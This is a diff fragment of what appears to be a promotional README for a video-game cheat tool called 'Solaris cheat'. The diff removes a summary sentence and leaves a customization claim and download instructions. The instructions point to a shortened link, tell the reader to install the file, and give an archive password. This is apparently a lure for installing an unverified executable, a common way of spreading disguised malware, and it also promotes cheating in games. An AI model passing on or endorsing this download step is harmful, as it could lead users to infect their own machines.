@@ -18,8 +18,6 @@ Solaris cheat is a powerful tool designed to enhance gameplay experience in vari
 
 6. Customization Options: Players can customize various settings within the cheat to suit their playstyle and preferences, enhancing the overall gaming experience.
 
-Overall, Solaris cheat is a comprehensive tool that offers a range of functionalities to help players excel in their favorite video games.
-
 🔰How to downoload: 
 click here: https://sul.su/LTSE and install file.
 password: 1357
